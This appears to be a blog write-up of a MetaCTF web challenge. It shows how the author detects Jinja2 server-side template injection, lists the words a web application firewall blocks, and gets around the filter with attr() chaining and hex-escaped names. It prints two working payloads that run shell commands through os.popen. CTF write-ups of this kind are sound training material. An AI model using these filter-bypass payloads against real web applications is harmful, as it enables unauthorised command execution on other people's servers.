---
layout: post
---

![](/assets/imgs/2025-10-17-mctf-template-title-card.png)

## Background

*Template Fury* is a web exploitation challenge by MetaCTF. The challenge involves unsanitized input with a weak WAF.

![](/assets/imgs/2025-10-17-mctf-template-fury-image-1.png)

![](/assets/imgs/2025-10-17-mctf-template-fury-image-2.png)

## Recon

Based on the name I assume this is an SSTI (server-side template injection) exploit.

Using this helpful chart I found on [PortSwigger](https://portswigger.net/web-security/server-side-template-injection) I can get an idea of which template is being used and how to exploit it.

![](/assets/imgs/2025-10-17-mctf-template-fury-image-3.png)

![](/assets/imgs/2025-10-17-mctf-template-fury-image-4.png)

## Exploitation

This confirms SSTI is possible and the template is Jinja2 because the output of `{{7*'7'}}` is `7777777`. If the output is `49` the template is Twig.

Now I search online and find a [onsecurity](https://onsecurity.io/article/server-side-template-injection-with-jinja2/) writeup about Jinja2 SSTI and try a payload.

![](/assets/imgs/2025-10-17-mctf-template-fury-image-5.png)

After some trial and error I deduce that the WAF (web application firewall) blocks the following:

`.`
`_`
`[`
`]`
`builtins`
`import`
`os`
`popen`

The writeup with the payload I used also includes some payloads if `.` `_` `[` and `]` are forbidden.

It uses `attr()` to bypass `.` `[` and `]` and uses the HTML entity `\x5f` instead of `_` .

```bash
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

![](/assets/imgs/2025-10-17-mctf-template-fury-image-6.png)

Since some terms are still forbidden I try encoding the forbidden terms as HTML entities as well.

```bash
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('id')|attr('read')()}}
```

![](/assets/imgs/2025-10-17-mctf-template-fury-image-7.png)

The command `id` works and confirms I can execute commands, now I just need to find and read the flag.

![](/assets/imgs/2025-10-17-mctf-template-fury-image-8.png)

![](/assets/imgs/2025-10-17-mctf-template-fury-image-9.png)

pce,\
bonta